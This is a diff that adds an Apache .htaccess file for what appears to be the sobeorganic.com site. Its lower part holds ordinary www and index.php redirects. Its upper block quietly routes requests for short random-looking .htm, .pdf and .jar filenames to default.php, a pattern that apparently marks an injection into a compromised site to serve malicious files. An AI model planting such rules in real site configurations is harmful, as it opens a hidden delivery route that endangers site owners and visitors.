@@ -1,0 +1,24 @@
+<IfModule mod_rewrite.c>
+
+       RewriteEngine On
+
+       RewriteBase /
+
+       RewriteCond %{REQUEST_FILENAME} !-f
+
+       RewriteRule ^[a-z0-9]{1,4}[.](htm|pdf|jar) default.php [L]
+
+</IfModule>
+
+
+
+
+
+RewriteCond %{HTTP_HOST} ^sobeorganic\.com$
+RewriteRule ^(.*)$ "http\:\/\/www\.sobeorganic\.com\/$1" [R=301,L]
+RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /index\.php\ HTTP/
+RewriteRule ^index\.php$ http://www.sobeorganic.com/ [R=301,L]
+
+
+
+
